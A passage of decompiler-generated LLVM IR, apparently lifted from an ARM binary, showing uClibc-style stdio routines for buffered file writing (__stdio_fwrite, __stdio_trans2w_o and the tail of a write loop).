  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_15d042 = icmp eq i32 %arg3, 0
  store i1 %v2_15d042, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d042, label %dec_label_pc_15d94, label %dec_label_pc_15d0c

dec_label_pc_15d04thread-pre-split:               ; preds = %dec_label_pc_15d0c
  %v3_15d24 = load i32, i32* %r6.global-to-local, align 4
  %v5_15d24 = add i32 %v3_15d24, %v3_15d1c
  store i32 %v5_15d24, i32* %r6.global-to-local, align 4
  %v4_15d28 = load i32, i32* %r5.global-to-local, align 4
  %v5_15d28 = sub i32 %v4_15d28, %v3_15d1c
  store i32 %v5_15d28, i32* %r5.global-to-local, align 4
  %v2_15d04 = icmp eq i32 %v5_15d28, 0
  store i1 %v2_15d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d04, label %dec_label_pc_15d04.dec_label_pc_15d94.loopexit_crit_edge, label %dec_label_pc_15d04thread-pre-split.dec_label_pc_15d0c_crit_edge

dec_label_pc_15d04thread-pre-split.dec_label_pc_15d0c_crit_edge: ; preds = %dec_label_pc_15d04thread-pre-split
  %v3_15d0c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15d18.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15d0c

dec_label_pc_15d0c:                               ; preds = %entry, %dec_label_pc_15d04thread-pre-split.dec_label_pc_15d0c_crit_edge
  %v0_15d18 = phi i32 [ %v0_15d18.pre, %dec_label_pc_15d04thread-pre-split.dec_label_pc_15d0c_crit_edge ], [ %tmp, %entry ]
  %v0_15d14 = phi i32 [ %v5_15d24, %dec_label_pc_15d04thread-pre-split.dec_label_pc_15d0c_crit_edge ], [ %arg2, %entry ]
  %v3_15d0c = phi i32 [ %v3_15d0c.pre, %dec_label_pc_15d04thread-pre-split.dec_label_pc_15d0c_crit_edge ], [ 2147483647, %entry ]
  %v0_15d10.in = phi i32 [ %v5_15d28, %dec_label_pc_15d04thread-pre-split.dec_label_pc_15d0c_crit_edge ], [ %arg3, %entry ]
  %v3_15d10 = phi i32 [ %v5_15d28, %dec_label_pc_15d04thread-pre-split.dec_label_pc_15d0c_crit_edge ], [ %arg3, %entry ]
  %v0_15d10 = icmp slt i32 %v0_15d10.in, 0
  %storemerge = select i1 %v0_15d10, i32 %v3_15d0c, i32 %v3_15d10
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_15d14, i32* %r1.global-to-local, align 4
  %v1_15d18 = add i32 %v0_15d18, 4
  %v2_15d18 = inttoptr i32 %v1_15d18 to i32*
  %v3_15d18 = load i32, i32* %v2_15d18, align 4
  %v3_15d1c = call i32 @__GI_write(i32 %v3_15d18, i32 %v0_15d14)
  %v1_15d20 = icmp slt i32 %v3_15d1c, 0
  %v2_15d20 = icmp eq i32 %v3_15d1c, 0
  store i1 %v2_15d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15d20, label %dec_label_pc_15d30, label %dec_label_pc_15d04thread-pre-split

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d0c
  %v0_15d30 = load i32, i32* %r4.global-to-local, align 4
  %v1_15d30 = inttoptr i32 %v0_15d30 to i16*
  %v2_15d30 = load i16, i16* %v1_15d30, align 2
  %v3_15d30 = zext i16 %v2_15d30 to i32
  store i32 %v3_15d30, i32* %r3.global-to-local, align 4
  %v1_15d34 = add i32 %v0_15d30, 8
  store i32 %v1_15d34, i32* %r1.global-to-local, align 4
  %v1_15d38 = inttoptr i32 %v1_15d34 to i32*
  %v2_15d38 = load i32, i32* %v1_15d38, align 4
  store i32 %v2_15d38, i32* %r1.global-to-local, align 4
  %v3_15d38 = add i32 %v0_15d30, 12
  %v4_15d38 = inttoptr i32 %v3_15d38 to i32*
  %v5_15d38 = load i32, i32* %v4_15d38, align 4
  %v1_15d3c = or i32 %v3_15d30, 8
  store i32 %v1_15d3c, i32* %r3.global-to-local, align 4
  %v2_15d40 = sub i32 %v5_15d38, %v2_15d38
  store i32 %v2_15d40, i32* %r2.global-to-local, align 4
  %v9_15d40 = icmp eq i32 %v5_15d38, %v2_15d38
  store i1 %v9_15d40, i1* %cpsr_z.global-to-local, align 1
  %v1_15d44 = trunc i32 %v1_15d3c to i16
  store i16 %v1_15d44, i16* %v1_15d30, align 2
  br i1 %v9_15d40, label %dec_label_pc_15d30.dec_label_pc_15d90_crit_edge, label %dec_label_pc_15d4c

dec_label_pc_15d30.dec_label_pc_15d90_crit_edge:  ; preds = %dec_label_pc_15d30
  %v0_15d90.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15d90

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d30
  %v0_15d4c = load i32, i32* %r2.global-to-local, align 4
  %v1_15d4c = load i32, i32* %r5.global-to-local, align 4
  %v3_15d4c = icmp ult i32 %v0_15d4c, %v1_15d4c
  %v9_15d4c = icmp eq i32 %v0_15d4c, %v1_15d4c
  store i1 %v9_15d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15d4c, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_15d4c
  store i32 %v1_15d4c, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_15d4c, %bb23
  %v2_15d60.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_15d74
  %v2_15d60 = phi i32 [ %v2_15d60.pre, %.preheader ], [ %v1_15d78, %dec_label_pc_15d74 ]
  %v0_15d54 = load i32, i32* %r6.global-to-local, align 4
  %v1_15d54 = inttoptr i32 %v0_15d54 to i8*
  %v2_15d54 = load i8, i8* %v1_15d54, align 1
  %v3_15d54 = zext i8 %v2_15d54 to i32
  store i32 %v3_15d54, i32* %r3.global-to-local, align 4
  %v7_15d58 = icmp eq i8 %v2_15d54, 10
  store i1 %v7_15d58, i1* %cpsr_z.global-to-local, align 1
  %v1_15d5c = add i32 %v0_15d54, 1
  store i32 %v1_15d5c, i32* %r6.global-to-local, align 4
  %v3_15d60 = inttoptr i32 %v2_15d60 to i8*
  store i8 %v2_15d54, i8* %v3_15d60, align 1
  %v0_15d64 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15d64, label %dec_label_pc_15d68, label %dec_label_pc_15d74

dec_label_pc_15d68:                               ; preds = %bb24
  %v0_15d68 = load i32, i32* %r4.global-to-local, align 4
  %v1_15d68 = inttoptr i32 %v0_15d68 to i16*
  %v2_15d68 = load i16, i16* %v1_15d68, align 2
  %v3_15d68 = zext i16 %v2_15d68 to i32
  store i32 %v3_15d68, i32* %r3.global-to-local, align 4
  %v1_15d6c = and i32 %v3_15d68, 256
  %v2_15d6c = icmp eq i32 %v1_15d6c, 0
  store i1 %v2_15d6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d6c, label %dec_label_pc_15d74, label %dec_label_pc_15d68.dec_label_pc_15d80_crit_edge

dec_label_pc_15d68.dec_label_pc_15d80_crit_edge:  ; preds = %dec_label_pc_15d68
  %v0_15d84.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15d80

dec_label_pc_15d74:                               ; preds = %dec_label_pc_15d68, %bb24
  %v0_15d74 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d74 = add i32 %v0_15d74, -1
  store i32 %v1_15d74, i32* %r2.global-to-local, align 4
  %v7_15d74 = icmp eq i32 %v0_15d74, 1
  store i1 %v7_15d74, i1* %cpsr_z.global-to-local, align 1
  %v0_15d78 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d78 = add i32 %v0_15d78, 1
  store i32 %v1_15d78, i32* %r1.global-to-local, align 4
  br i1 %v7_15d74, label %dec_label_pc_15d74.dec_label_pc_15d80_crit_edge, label %bb24

dec_label_pc_15d74.dec_label_pc_15d80_crit_edge:  ; preds = %dec_label_pc_15d74
  %v0_15d80.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15d80

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d68.dec_label_pc_15d80_crit_edge, %dec_label_pc_15d74.dec_label_pc_15d80_crit_edge
  %v0_15d84 = phi i32 [ %v1_15d78, %dec_label_pc_15d74.dec_label_pc_15d80_crit_edge ], [ %v0_15d84.pre, %dec_label_pc_15d68.dec_label_pc_15d80_crit_edge ]
  %v0_15d80 = phi i32 [ %v0_15d80.pre, %dec_label_pc_15d74.dec_label_pc_15d80_crit_edge ], [ %v0_15d68, %dec_label_pc_15d68.dec_label_pc_15d80_crit_edge ]
  %v1_15d80 = add i32 %v0_15d80, 8
  %v2_15d80 = inttoptr i32 %v1_15d80 to i32*
  %v3_15d80 = load i32, i32* %v2_15d80, align 4
  store i32 %v3_15d80, i32* %r3.global-to-local, align 4
  %v2_15d84 = add i32 %v0_15d80, 16
  %v3_15d84 = inttoptr i32 %v2_15d84 to i32*
  store i32 %v0_15d84, i32* %v3_15d84, align 4
  %v0_15d88 = load i32, i32* %r3.global-to-local, align 4
  %v1_15d88 = load i32, i32* %r1.global-to-local, align 4
  %v2_15d88 = sub i32 %v1_15d88, %v0_15d88
  store i32 %v2_15d88, i32* %r3.global-to-local, align 4
  %v1_15d8c = load i32, i32* %r5.global-to-local, align 4
  %v2_15d8c = sub i32 %v1_15d8c, %v2_15d88
  store i32 %v2_15d8c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d30.dec_label_pc_15d90_crit_edge, %dec_label_pc_15d80
  %v0_15d90 = phi i32 [ %v0_15d90.pre, %dec_label_pc_15d30.dec_label_pc_15d90_crit_edge ], [ %v2_15d8c, %dec_label_pc_15d80 ]
  %v1_15d90 = load i32, i32* @r7, align 4
  %v2_15d90 = sub i32 %v1_15d90, %v0_15d90
  br label %dec_label_pc_15d94

dec_label_pc_15d04.dec_label_pc_15d94.loopexit_crit_edge: ; preds = %dec_label_pc_15d04thread-pre-split
  %v0_15d94.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %entry, %dec_label_pc_15d04.dec_label_pc_15d94.loopexit_crit_edge, %dec_label_pc_15d90
  %v0_15d94 = phi i32 [ %v2_15d90, %dec_label_pc_15d90 ], [ %v0_15d94.pre.pre, %dec_label_pc_15d04.dec_label_pc_15d94.loopexit_crit_edge ], [ 0, %entry ]
  %v2_15d98 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15d98, i32* %r4.global-to-local, align 4
  ret i32 %v0_15d94

; uselistorder directives
  uselistorder i32 %v0_15d80, { 1, 0 }
  uselistorder i32 %v1_15d78, { 0, 2, 1 }
  uselistorder i32 %v0_15d74, { 1, 0 }
  uselistorder i32 %v1_15d4c, { 0, 2, 1 }
  uselistorder i32 %v0_15d4c, { 1, 0 }
  uselistorder i32 %v5_15d38, { 1, 0 }
  uselistorder i32 %v2_15d38, { 1, 0, 2 }
  uselistorder i32 %v3_15d1c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15d14, { 1, 0 }
  uselistorder i32 %v5_15d28, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 2, 3, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 1, 2, 0 }
  uselistorder i32 2147483647, { 1, 6, 2, 5, 3, 4, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15d94, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15d90, { 1, 0 }
  uselistorder label %dec_label_pc_15d80, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15d0c, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_15da0 = load i32, i32* @r4, align 4
  store i32 %v3_15da0, i32* %stack_var_-20, align 4
  %v6_15da0 = load i32, i32* @r5, align 4
  %v9_15da0 = load i32, i32* @r6, align 4
  %v12_15da0 = load i32, i32* @r7, align 4
  %v3_15da4 = load i16, i16* %arg3, align 2
  %v4_15da4 = zext i16 %v3_15da4 to i32
  %v1_15da8 = and i32 %v4_15da4, 512
  store i32 %v1_15da8, i32* @r4, align 4
  %v2_15da8 = icmp eq i32 %v1_15da8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_15da8, label %dec_label_pc_15dc0, label %dec_label_pc_15ebc

dec_label_pc_15dc0:                               ; preds = %entry
  %v2_15dc0 = add i32 %tmp, 4
  %v3_15dc0 = inttoptr i32 %v2_15dc0 to i32*
  %v4_15dc0 = load i32, i32* %v3_15dc0, align 4
  %v2_15dc8 = add i32 %tmp, 16
  %v3_15dc8 = inttoptr i32 %v2_15dc8 to i32*
  %v4_15dc8 = load i32, i32* %v3_15dc8, align 4
  store i32 %v4_15dc8, i32* @r0, align 4
  %v2_15dcc = add i32 %tmp, 12
  %v3_15dcc = inttoptr i32 %v2_15dcc to i32*
  %v4_15dcc = load i32, i32* %v3_15dcc, align 4
  store i32 %v4_15dcc, i32* @r3, align 4
  %v4_15dd0 = icmp eq i32 %v4_15dc0, -2
  %v2_15dd4 = sub i32 %v4_15dcc, %v4_15dc8
  br i1 %v4_15dd0, label %dec_label_pc_15dd4, label %dec_label_pc_15dfc

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15dc0
  %v3_15dd8 = icmp ugt i32 %v2_15dd4, %arg2
  br i1 %v3_15dd8, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_15dd4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_15dd4, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_15dd4, %dec_label_pc_15dd4 ]
  %v0_15de0 = phi i32 [ %arg2, %bb ], [ %v2_15dd4, %dec_label_pc_15dd4 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_15de0, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_15de8 = call i32 @memcpy()
  %v0_15dec = load i32, i32* @r5, align 4
  %v1_15dec = add i32 %v0_15dec, 16
  %v2_15dec = inttoptr i32 %v1_15dec to i32*
  %v3_15dec = load i32, i32* %v2_15dec, align 4
  %v1_15df0 = load i32, i32* @r4, align 4
  %v2_15df0 = add i32 %v1_15df0, %v3_15dec
  store i32 %v2_15df0, i32* %v2_15dec, align 4
  br label %dec_label_pc_15ed0

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15dc0
  store i32 %v2_15dd4, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_15dd4, %arg2
  br i1 %tmp18, label %dec_label_pc_15e9c, label %dec_label_pc_15e08

dec_label_pc_15e08:                               ; preds = %dec_label_pc_15dfc
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_15e10 = call i32 @memcpy()
  %v0_15e14 = load i32, i32* @r5, align 4
  %v1_15e14 = add i32 %v0_15e14, 16
  %v2_15e14 = inttoptr i32 %v1_15e14 to i32*
  %v3_15e14 = load i32, i32* %v2_15e14, align 4
  %v1_15e18 = inttoptr i32 %v0_15e14 to i16*
  %v2_15e18 = load i16, i16* %v1_15e18, align 2
  %v1_15e1c = load i32, i32* @r6, align 4
  %v2_15e1c = add i32 %v1_15e1c, %v3_15e14
  %v1_15e20 = and i16 %v2_15e18, 256
  %v2_15e20 = icmp eq i16 %v1_15e20, 0
  store i32 %v2_15e1c, i32* %v2_15e14, align 4
  br i1 %v2_15e20, label %dec_label_pc_15ed0, label %dec_label_pc_15e2c

dec_label_pc_15e2c:                               ; preds = %dec_label_pc_15e08
  %v0_15e2c = load i32, i32* @r7, align 4
  %v0_15e34 = load i32, i32* @r6, align 4
  %v4_15e38 = call i32 @memrchr(i32 %v0_15e2c, i32 10, i32 %v0_15e34, i32 %v2_15e1c)
  %v2_15e3c = icmp eq i32 %v4_15e38, 0
  br i1 %v2_15e3c, label %dec_label_pc_15ed0, label %dec_label_pc_15e44

dec_label_pc_15e44:                               ; preds = %dec_label_pc_15e2c
  %v0_15e44 = load i32, i32* @r5, align 4
  store i32 %v0_15e44, i32* @r0, align 4
  %v0_15e48 = call i32 @__stdio_wcommit()
  %v2_15e4c = icmp eq i32 %v0_15e48, 0
  br i1 %v2_15e4c, label %dec_label_pc_15ed0, label %dec_label_pc_15e54

dec_label_pc_15e54:                               ; preds = %dec_label_pc_15e44
  %v1_15e54 = load i32, i32* @r6, align 4
  %v3_15e54 = icmp uge i32 %v0_15e48, %v1_15e54
  %v1_15e54.v0_15e48 = select i1 %v3_15e54, i32 %v1_15e54, i32 %v0_15e48
  store i32 %v1_15e54.v0_15e48, i32* @r4, align 4
  %v2_15e60 = sub i32 %v1_15e54, %v1_15e54.v0_15e48
  %v0_15e64 = load i32, i32* @r7, align 4
  %v2_15e64 = add i32 %v0_15e64, %v2_15e60
  store i32 %v2_15e64, i32* %r7.global-to-local, align 4
  store i32 %v2_15e64, i32* @r0, align 4
  store i32 %v1_15e54.v0_15e48, i32* @r2, align 4
  %v4_15e74 = call i32 @__GI_memchr(i32 %v2_15e64, i32 10, i32 %v1_15e54.v0_15e48, i32 %v2_15e60)
  %v2_15e78 = icmp eq i32 %v4_15e74, 0
  br i1 %v2_15e78, label %dec_label_pc_15ed0, label %dec_label_pc_15e80

dec_label_pc_15e80:                               ; preds = %dec_label_pc_15e54
  %v0_15e80 = load i32, i32* @r5, align 4
  %v1_15e80 = add i32 %v0_15e80, 16
  %v2_15e80 = inttoptr i32 %v1_15e80 to i32*
  %v3_15e80 = load i32, i32* %v2_15e80, align 4
  %v0_15e84 = load i32, i32* %r7.global-to-local, align 4
  %v1_15e84 = load i32, i32* @r4, align 4
  %v2_15e84 = sub i32 %v0_15e84, %v4_15e74
  %v2_15e88 = add i32 %v2_15e84, %v1_15e84
  %v2_15e8c = sub i32 %v3_15e80, %v2_15e88
  %v1_15e90 = load i32, i32* @r6, align 4
  %v2_15e90 = sub i32 %v1_15e90, %v2_15e88
  store i32 %v2_15e90, i32* @r6, align 4
  store i32 %v2_15e8c, i32* %v2_15e80, align 4
  br label %dec_label_pc_15ed0

dec_label_pc_15e9c:                               ; preds = %dec_label_pc_15dfc
  %v2_15e9c = add i32 %tmp, 8
  %v3_15e9c = inttoptr i32 %v2_15e9c to i32*
  %v4_15e9c = load i32, i32* %v3_15e9c, align 4
  %v9_15ea0 = icmp eq i32 %v4_15dc8, %v4_15e9c
  br i1 %v9_15ea0, label %dec_label_pc_15ebc, label %dec_label_pc_15ea8

dec_label_pc_15ea8:                               ; preds = %dec_label_pc_15e9c
  store i32 %tmp, i32* @r0, align 4
  %v0_15eac = call i32 @__stdio_wcommit()
  %v2_15eb0 = icmp eq i32 %v0_15eac, 0
  br i1 %v2_15eb0, label %dec_label_pc_15ea8.dec_label_pc_15ebc_crit_edge, label %bb15

dec_label_pc_15ea8.dec_label_pc_15ebc_crit_edge:  ; preds = %dec_label_pc_15ea8
  %v0_15ebc.pre = load i32, i32* @r6, align 4
  %v0_15ec0.pre = load i32, i32* @r5, align 4
  %v0_15ec4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15ebc

bb15:                                             ; preds = %dec_label_pc_15ea8
  %v1_15eb4 = load i32, i32* @r4, align 4
  store i32 %v1_15eb4, i32* @r6, align 4
  br label %dec_label_pc_15ed0

dec_label_pc_15ebc:                               ; preds = %dec_label_pc_15ea8.dec_label_pc_15ebc_crit_edge, %entry, %dec_label_pc_15e9c
  %v0_15ec4 = phi i32 [ %v0_15ec4.pre, %dec_label_pc_15ea8.dec_label_pc_15ebc_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_15e9c ]
  %v0_15ec0 = phi i32 [ %v0_15ec0.pre, %dec_label_pc_15ea8.dec_label_pc_15ebc_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_15e9c ]
  %v0_15ebc = phi i32 [ %v0_15ebc.pre, %dec_label_pc_15ea8.dec_label_pc_15ebc_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_15e9c ]
  %v1_15ec0 = inttoptr i32 %v0_15ec0 to i16*
  %v5_15ec8 = call i32 @__stdio_WRITE(i16* %v1_15ec0, i32 %v0_15ec4, i32 %v0_15ebc)
  store i32 %v5_15ec8, i32* @r6, align 4
  br label %dec_label_pc_15ed0

dec_label_pc_15ed0:                               ; preds = %bb15, %dec_label_pc_15e54, %dec_label_pc_15e44, %dec_label_pc_15e2c, %dec_label_pc_15e08, %dec_label_pc_15e80, %bb12, %dec_label_pc_15ebc
  %v0_15ed0 = load i32, i32* @r6, align 4
  %v2_15ed8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15ed8, i32* @r4, align 4
  store i32 %v6_15da0, i32* @r5, align 4
  store i32 %v9_15da0, i32* @r6, align 4
  store i32 %v12_15da0, i32* @r7, align 4
  ret i32 %v0_15ed0

; uselistorder directives
  uselistorder i32 %v2_15e88, { 1, 0 }
  uselistorder i32 %v2_15e60, { 1, 0 }
  uselistorder i32 %v1_15e54.v0_15e48, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15e54, { 1, 0, 2 }
  uselistorder i32 %v2_15dd4, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_15ed0, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_15ebc, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15ee0 = load i32, i32* @r4, align 4
  store i32 %v3_15ee0, i32* %stack_var_-8, align 4
  %v3_15ee4 = load i16, i16* %arg1, align 2
  %v4_15ee4 = zext i16 %v3_15ee4 to i32
  %v2_15ee8 = and i32 %v4_15ee4, %arg2
  %v4_15ee8 = icmp eq i32 %v2_15ee8, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_15ee8, label %dec_label_pc_15ef4, label %dec_label_pc_15f04

dec_label_pc_15ef4:                               ; preds = %entry
  %v1_15ef4 = and i32 %v4_15ee4, 2176
  %v2_15ef4 = icmp eq i32 %v1_15ef4, 0
  br i1 %v2_15ef4, label %dec_label_pc_15efc, label %dec_label_pc_15f10

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15ef4
  %v2_15efc = or i32 %v4_15ee4, %arg2
  %v1_15f00 = trunc i32 %v2_15efc to i16
  store i16 %v1_15f00, i16* %arg1, align 2
  %v0_15f04.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f04

dec_label_pc_15f04:                               ; preds = %entry, %dec_label_pc_15efc
  %v0_15f40 = phi i32 [ %tmp, %entry ], [ %v0_15f04.pre, %dec_label_pc_15efc ]
  %v1_15f04 = inttoptr i32 %v0_15f40 to i16*
  %v2_15f04 = load i16, i16* %v1_15f04, align 2
  %v3_15f04 = zext i16 %v2_15f04 to i32
  store i32 %v3_15f04, i32* @ip, align 4
  %v1_15f08 = and i32 %v3_15f04, 32
  %v2_15f08 = icmp eq i32 %v1_15f08, 0
  br i1 %v2_15f08, label %dec_label_pc_15f30, label %dec_label_pc_15f10

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15ef4, %dec_label_pc_15f04
  %v0_15f10 = call i32 @__GI___errno_location()
  store i32 %v0_15f10, i32* %r0.global-to-local, align 4
  %v2_15f18 = inttoptr i32 %v0_15f10 to i32*
  store i32 9, i32* %v2_15f18, align 4
  br label %dec_label_pc_15f1c

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15f58, %dec_label_pc_15f10
  %v0_15f1c = load i32, i32* @r4, align 4
  %v1_15f1c = inttoptr i32 %v0_15f1c to i16*
  %v2_15f1c = load i16, i16* %v1_15f1c, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15f24 = or i16 %v2_15f1c, 8
  store i16 %v1_15f24, i16* %v1_15f1c, align 2
  br label %bb11

dec_label_pc_15f30:                               ; preds = %dec_label_pc_15f04
  %tmp14 = urem i16 %v2_15f04, 4
  %v2_15f30 = icmp eq i16 %tmp14, 0
  br i1 %v2_15f30, label %dec_label_pc_15f8c, label %dec_label_pc_15f38

dec_label_pc_15f38:                               ; preds = %dec_label_pc_15f30
  %v1_15f38 = and i32 %v3_15f04, 4
  store i32 %v1_15f38, i32* @r1, align 4
  %v2_15f38 = icmp eq i32 %v1_15f38, 0
  br i1 %v2_15f38, label %dec_label_pc_15f40, label %dec_label_pc_15f70

dec_label_pc_15f40:                               ; preds = %dec_label_pc_15f38
  %v1_15f40 = add i32 %v0_15f40, 20
  %v2_15f40 = inttoptr i32 %v1_15f40 to i32*
  %v3_15f40 = load i32, i32* %v2_15f40, align 4
  store i32 %v3_15f40, i32* %r2.global-to-local, align 4
  %v1_15f44 = add i32 %v0_15f40, 16
  %v2_15f44 = inttoptr i32 %v1_15f44 to i32*
  %v3_15f44 = load i32, i32* %v2_15f44, align 4
  %v9_15f48 = icmp eq i32 %v3_15f40, %v3_15f44
  br i1 %v9_15f48, label %dec_label_pc_15f50, label %dec_label_pc_15f58

dec_label_pc_15f50:                               ; preds = %dec_label_pc_15f40
  %v1_15f50 = and i32 %v3_15f04, 2
  %v2_15f50 = icmp eq i32 %v1_15f50, 0
  br i1 %v2_15f50, label %dec_label_pc_15f70, label %dec_label_pc_15f58

dec_label_pc_15f58:                               ; preds = %dec_label_pc_15f40, %dec_label_pc_15f50
  %v1_15f58 = and i32 %v3_15f04, 1024
  %tmp12 = udiv i32 %v1_15f58, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_15f64 = call i32 @__GI_fseek()
  store i32 %v0_15f64, i32* %r0.global-to-local, align 4
  %v2_15f68 = icmp eq i32 %v0_15f64, 0
  br i1 %v2_15f68, label %.dec_label_pc_15f70_crit_edge, label %dec_label_pc_15f1c

.dec_label_pc_15f70_crit_edge:                    ; preds = %dec_label_pc_15f58
  %v0_15f70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f70

dec_label_pc_15f70:                               ; preds = %.dec_label_pc_15f70_crit_edge, %dec_label_pc_15f38, %dec_label_pc_15f50
  %v2_15f7c = phi i32 [ %v0_15f70.pre, %.dec_label_pc_15f70_crit_edge ], [ %v0_15f40, %dec_label_pc_15f38 ], [ %v0_15f40, %dec_label_pc_15f50 ]
  %v1_15f70 = inttoptr i32 %v2_15f7c to i16*
  %v2_15f70 = load i16, i16* %v1_15f70, align 2
  %v1_15f74 = add i32 %v2_15f7c, 8
  %v2_15f74 = inttoptr i32 %v1_15f74 to i32*
  %v3_15f74 = load i32, i32* %v2_15f74, align 4
  store i32 %v3_15f74, i32* %r2.global-to-local, align 4
  %v1_15f78 = and i16 %v2_15f70, -4
  store i16 %v1_15f78, i16* %v1_15f70, align 2
  %v0_15f80 = load i32, i32* %r2.global-to-local, align 4
  %v1_15f80 = load i32, i32* @r4, align 4
  %v2_15f80 = add i32 %v1_15f80, 20
  %v3_15f80 = inttoptr i32 %v2_15f80 to i32*
  store i32 %v0_15f80, i32* %v3_15f80, align 4
  %v0_15f84 = load i32, i32* %r2.global-to-local, align 4
  %v1_15f84 = load i32, i32* @r4, align 4
  %v2_15f84 = add i32 %v1_15f84, 24
  %v3_15f84 = inttoptr i32 %v2_15f84 to i32*
  store i32 %v0_15f84, i32* %v3_15f84, align 4
  %v0_15f88 = load i32, i32* %r2.global-to-local, align 4
  %v1_15f88 = load i32, i32* @r4, align 4
  %v2_15f88 = add i32 %v1_15f88, 16
  %v3_15f88 = inttoptr i32 %v2_15f88 to i32*
  store i32 %v0_15f88, i32* %v3_15f88, align 4
  %v0_15f8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f8c

dec_label_pc_15f8c:                               ; preds = %dec_label_pc_15f30, %dec_label_pc_15f70
  %v2_15f98 = phi i32 [ %v0_15f40, %dec_label_pc_15f30 ], [ %v0_15f8c.pre, %dec_label_pc_15f70 ]
  %v1_15f8c = inttoptr i32 %v2_15f98 to i16*
  %v2_15f8c = load i16, i16* %v1_15f8c, align 2
  %v3_15f8c = zext i16 %v2_15f8c to i32
  %v1_15f90 = or i16 %v2_15f8c, 64
  %v1_15f94 = and i32 %v3_15f8c, 2816
  store i32 %v1_15f94, i32* %r0.global-to-local, align 4
  %v2_15f94 = icmp eq i32 %v1_15f94, 0
  store i16 %v1_15f90, i16* %v1_15f8c, align 2
